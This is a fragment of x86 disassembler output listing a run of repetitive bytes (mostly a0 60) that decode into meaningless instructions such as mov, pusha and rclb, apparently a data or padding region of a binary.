  40c0f4:	a0 60 40 60 a0       	mov    0xa0604060,%al
  40c0f9:	98                   	cwtl
  40c0fa:	a0 60 a0 88 d0       	mov    0xd088a060,%al
  40c0ff:	8c d0                	mov    %ss,%eax
  40c101:	90                   	nop
  40c102:	d0 94 d0 98 d0 9c d0 	rclb   $1,-0x2f632f68(%eax,%edx,8)
  40c109:	a0 d0 a8 d0 ac       	mov    0xacd0a8d0,%al
  40c10e:	d0 b0 d0 f0 d0 f4    	shlb   $1,-0xb2f0f30(%eax)
  40c114:	d0 f8                	sar    $1,%al
  40c116:	d0 18                	rcrb   $1,(%eax)
  40c118:	d0 1c d0             	rcrb   $1,(%eax,%edx,8)
  40c11b:	20 d0                	and    %dl,%al
  40c11d:	24 d0                	and    $0xd0,%al
  40c11f:	8c d8                	mov    %ds,%eax
  40c121:	90                   	nop
  40c122:	d8 94 d8 98 d8 9c d8 	fcoms  -0x27632768(%eax,%ebx,8)
  40c129:	a0 d8 60 a0 60       	mov    0x60a060d8,%al
  40c12e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c133:	60                   	pusha
  40c134:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c139:	60                   	pusha
  40c13a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c13f:	60                   	pusha
  40c140:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c145:	60                   	pusha
  40c146:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c14b:	60                   	pusha
  40c14c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c151:	60                   	pusha
  40c152:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c157:	60                   	pusha
  40c158:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c15d:	60                   	pusha
  40c15e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c163:	60                   	pusha
  40c164:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c169:	60                   	pusha
  40c16a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c16f:	60                   	pusha
  40c170:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c175:	60                   	pusha
  40c176:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c17b:	60                   	pusha
  40c17c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c181:	60                   	pusha
  40c182:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c187:	60                   	pusha
  40c188:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c18d:	60                   	pusha
  40c18e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c193:	60                   	pusha
  40c194:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c199:	60                   	pusha
  40c19a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c19f:	60                   	pusha
  40c1a0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1a5:	60                   	pusha
  40c1a6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1ab:	60                   	pusha
  40c1ac:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1b1:	60                   	pusha
  40c1b2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1b7:	60                   	pusha
  40c1b8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1bd:	60                   	pusha
  40c1be:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1c3:	60                   	pusha
  40c1c4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1c9:	60                   	pusha
  40c1ca:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1cf:	60                   	pusha
  40c1d0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1d5:	60                   	pusha
  40c1d6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1db:	60                   	pusha
  40c1dc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1e1:	60                   	pusha
  40c1e2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1e7:	60                   	pusha
  40c1e8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1ed:	60                   	pusha
  40c1ee:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1f3:	60                   	pusha
  40c1f4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1f9:	60                   	pusha
  40c1fa:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c1ff:	60                   	pusha
  40c200:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c205:	60                   	pusha
  40c206:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c20b:	60                   	pusha
  40c20c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c211:	60                   	pusha
  40c212:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c217:	60                   	pusha
  40c218:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c21d:	60                   	pusha
  40c21e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c223:	60                   	pusha
  40c224:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c229:	60                   	pusha
  40c22a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c22f:	60                   	pusha
  40c230:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c235:	60                   	pusha
  40c236:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c23b:	60                   	pusha
  40c23c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c241:	60                   	pusha
  40c242:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c247:	60                   	pusha
  40c248:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c24d:	60                   	pusha
  40c24e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c253:	60                   	pusha
  40c254:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c259:	60                   	pusha
  40c25a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c25f:	60                   	pusha
  40c260:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c265:	60                   	pusha
  40c266:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c26b:	60                   	pusha
  40c26c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c271:	60                   	pusha
  40c272:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c277:	60                   	pusha
  40c278:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c27d:	60                   	pusha
  40c27e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c283:	60                   	pusha
  40c284:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40c289:	00 00                	add    %al,(%eax)
	...
